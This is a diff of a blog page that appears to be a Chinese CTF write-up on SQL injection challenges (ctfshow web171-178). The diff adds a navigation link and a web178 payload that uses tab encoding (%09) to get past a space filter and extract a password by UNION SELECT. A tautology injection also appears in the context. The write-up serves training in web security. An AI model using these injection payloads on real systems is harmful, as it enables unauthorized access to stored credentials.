@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131417799.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131454209.png">
 <meta property="article:published_time" content="2025-03-31T04:32:32.000Z">
-<meta property="article:modified_time" content="2025-04-01T05:15:15.811Z">
+<meta property="article:modified_time" content="2025-04-03T05:39:26.651Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -103,6 +103,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/03/web179-186/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/03/31/web167-170/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -232,6 +234,7 @@
 <p><img src="/2025/03/31/web171-178/file-20250401131252303.png"></p>
 <h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>过滤了空格与<code>*</code>号等用<code>%09</code>绕过<br>id&#x3D;1’or’1’&#x3D;’1’%23</p>
 <p><img src="/2025/03/31/web171-178/file-20250401131417799.png"></p>
+<p>payload: <code>1&#39;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09=%09&#39;flag&#39;)%09%23</code></p>
 <p><img src="/2025/03/31/web171-178/file-20250401131454209.png"></p>
 
   </div>
